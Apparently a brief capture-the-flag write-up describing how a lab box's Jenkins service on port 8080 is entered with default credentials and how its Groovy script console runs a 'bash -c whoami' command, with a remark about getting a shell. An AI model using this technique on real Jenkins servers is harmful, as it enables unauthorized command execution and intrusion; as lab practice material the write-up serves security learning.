this box has one http port 8080

visiting this shows us a jenkkins installation

trying the login root:password lets us login

{boxip}:8080/script
gives us a console

using this we can get the flag or fix a shell:
def proc = ['bash', '-c', 'whoami'].execute()
def outputStream = new StringBuffer()
def errorStream = new StringBuffer()

proc.waitForProcessOutput(outputStream, errorStream)

println "Output: ${outputStream}"
println "Error: ${errorStream}"
